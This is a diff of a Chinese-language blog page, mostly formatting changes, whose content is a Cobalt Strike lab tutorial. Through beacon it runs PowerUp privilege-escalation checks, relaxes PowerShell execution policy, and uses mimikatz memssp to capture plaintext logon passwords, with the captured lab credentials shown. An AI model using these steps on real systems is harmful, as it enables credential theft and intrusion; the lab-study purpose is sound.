@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -470,10 +473,11 @@
 <p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
 </blockquote>
 <h1 id="0x01-PowerUp-的使用"><a href="#0x01-PowerUp-的使用" class="headerlink" title="0x01 PowerUp 的使用"></a>0x01 PowerUp 的使用</h1><p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p>
-<pre><code>powershell-import PowerUp.ps1
-powershell invoke-allchecks</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">powershell-import PowerUp.ps1
+powershell invoke-allchecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>详细运行过程：</p>
-<pre><code>beacon&gt; powershell-import PowerUp.ps1
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; powershell-import PowerUp.ps1
 [*] Tasked beacon to import: PowerUp.ps1
 [+] host called home, sent: 275084 bytes
 
@@ -524,22 +528,22 @@ AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Windows\system32\WindowsPow
 Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use
                  r Process
 Path           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusr
-ModifiableFile : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files
-                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference=BUILTIN\A
+ModifiableFile : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files
+                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference&#x3D;BUILTIN\A
                  dministrators&#125;
 ……内容太多，此处省略……
 
-[*] Checking for modifiable schtask files/configs...
+[*] Checking for modifiable schtask files&#x2F;configs...
 [+] received output:
 TaskName     : GoogleUpdateTaskMachineCore
-TaskFilePath : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files (
-               x86)\Google\Update\GoogleUpdate.exe; IdentityReference=BUILTIN\A
+TaskFilePath : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files (
+               x86)\Google\Update\GoogleUpdate.exe; IdentityReference&#x3D;BUILTIN\A
                dministrators&#125;
-TaskTrigger  : &lt;Triggers xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mi
-               t/task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;&lt;Cal
-               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;/StartBoundary&gt;&lt;
-               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;/DaysInterval&gt;&lt;/ScheduleByDay&gt;&lt;/Ca
-               lendarTrigger&gt;&lt;/Triggers&gt;
+TaskTrigger  : &lt;Triggers xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mi
+               t&#x2F;task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;&lt;&#x2F;LogonTrigger&gt;&lt;Cal
+               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;&#x2F;StartBoundary&gt;&lt;
+               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;&#x2F;DaysInterval&gt;&lt;&#x2F;ScheduleByDay&gt;&lt;&#x2F;Ca
+               lendarTrigger&gt;&lt;&#x2F;Triggers&gt;
 ……内容太多，此处省略……
 
 [*] Checking for unattended install files...
@@ -550,15 +554,17 @@ UnattendPath : C:\Windows\Panther\Unattend.xml
 [*] Checking for plaintext passwords in McAfee SiteList.xml files....
 [+] received output:
 [*] Checking for cached Group Policy Preferences .xml files....
-[+] received output:</code></pre>
+[+] received output:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p>
 <p>这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code> PowerUp.ps1</code>文件了。</p>
-<pre><code>PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned
+<pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned
 执行策略更改
-执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
+执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170
 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
 [Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y
-PS C:\WINDOWS\system32&gt;</code></pre>
+PS C:\WINDOWS\system32&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p>
 <p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p>
 <p>参考网上相关文章后也未果，这也是为什么这一节拖更这么久的原因，因此 PowerUp 的复现过程暂时就没法记录了。</p>
@@ -607,19 +613,21 @@ PS C:\WINDOWS\system32&gt;</code></pre>
 </li>
 </ul>
 <p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p>
-<pre><code>mimikatz !misc::memssp
+<pre class="line-numbers language-none"><code class="language-none">mimikatz !misc::memssp
 cd C:\Windows\system32
 shell dir mimilsa.log
-shell type mimilsa.log</code></pre>
+shell type mimilsa.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>详细运行过程：</p>
 <p>首先运行<code>mimikatz !misc::memssp</code></p>
-<pre><code>beacon&gt; mimikatz !misc::memssp
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; mimikatz !misc::memssp
 [*] Tasked beacon to run mimikatz&#39;s !misc::memssp command
 [+] host called home, sent: 1006151 bytes
 [+] received output:
-Injected =)</code></pre>
+Injected &#x3D;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>接下来来到<code>C:\Windows\system32</code>目录</p>
-<pre><code>beacon&gt; cd C:\Windows\system32
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; cd C:\Windows\system32
 [*] cd C:\Windows\system32
 [+] host called home, sent: 27 bytes
 
@@ -632,17 +640,19 @@ beacon&gt; shell dir mimilsa.log
 
  C:\Windows\system32 的目录
 
-2020/07/23  21:47                24 mimilsa.log
+2020&#x2F;07&#x2F;23  21:47                24 mimilsa.log
                1 个文件             24 字节
-               0 个目录 17,394,728,960 可用字节</code></pre>
+               0 个目录 17,394,728,960 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p>
 <p>查看<code>mimilsa.log</code>文件内容。</p>
-<pre><code>beacon&gt; shell type mimilsa.log
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; shell type mimilsa.log
 [*] Tasked beacon to run: type mimilsa.log
 [+] host called home, sent: 47 bytes
 [+] received output:
-[00000000:000003e5] \    
-[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!</code></pre>
+[00000000:000003e5] \	
+[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator	Password123!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>成功获取到当前登录用户的明文密码。</p>
 <blockquote>
 <p>参考链接：</p>
@@ -1082,7 +1092,7 @@ beacon&gt; shell dir mimilsa.log
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
